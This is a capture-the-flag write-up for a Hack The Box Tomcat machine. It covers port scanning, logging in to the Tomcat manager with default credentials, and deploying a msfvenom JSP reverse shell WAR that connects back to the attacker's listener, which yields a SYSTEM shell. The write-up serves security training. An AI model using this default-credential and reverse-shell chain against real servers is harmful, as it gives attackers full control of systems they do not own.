Start with a ping
```shell-session
┌──(strombach㉿HTBmachine)-[~]
└─$ ping 10.129.39.22
PING 10.129.39.22 (10.129.39.22) 56(84) bytes of data.
64 bytes from 10.129.39.22: icmp_seq=1 ttl=127 time=37.8 ms
64 bytes from 10.129.39.22: icmp_seq=2 ttl=127 time=37.5 ms
64 bytes from 10.129.39.22: icmp_seq=3 ttl=127 time=37.3 ms
^C
--- 10.129.39.22 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 37.279/37.526/37.774/0.202 ms
```

Nmap scan:
I found  the port 8080 running Apche Tomcat/Coyote JSP engine 1.1.
```shell-session
┌──(strombach㉿HTBmachine)-[~]
└─$ nmap 10.129.39.22 -sV -sC -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 13:17 CET
Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 85.58% done; ETC: 13:19 (0:00:20 remaining)
Nmap scan report for 10.129.39.22
Host is up (0.038s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.13 seconds
```

Trying to access the web server through a web browser. This is what we see:
![](Pasted%20image%2020250212150429.png)

![](Pasted%20image%2020250212150910.png)

An Alert windows appear, trying {admin:admin}
![](Pasted%20image%2020250212151045.png)

When entering wrong username or password 403 page appears.
![](Pasted%20image%2020250212151106.png)
In this page We Find this:
```shell-session
<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```
Let's try this as credentials in the alert popup.

By using this example password we can access both Server Status
![](Pasted%20image%2020250212151642.png)

And

Manager App
![](Pasted%20image%2020250212151812.png)

Using the WAR file deploy button at the bottom we can upload war files that adds a path trying to execute the code.
![](Pasted%20image%2020250212160404.png)

Let's try to create a reverse shell and upload it to the server using msfvenom.
```shell-session
┌──(strombach㉿HTBmachine)-[~]
└─$ msfvenom -l payloads | grep jsp    
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
```

```shell-session
┌──(strombach㉿HTBmachine)-[~]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.69 LPORT=4444 -f war > shell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
```

Uploaded successful and the server started running the code.
![](Pasted%20image%2020250212160444.png)

Start listening with netcat
```shell-session
nc -lvnp 4444
```


![](Pasted%20image%2020250212163722.png)

We see that we got access to the System account. The most powerful account and builtin account in Windows.
```shell-session
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

By exploring the system we finally find the file containing both flags.
![](Pasted%20image%2020250212164339.png)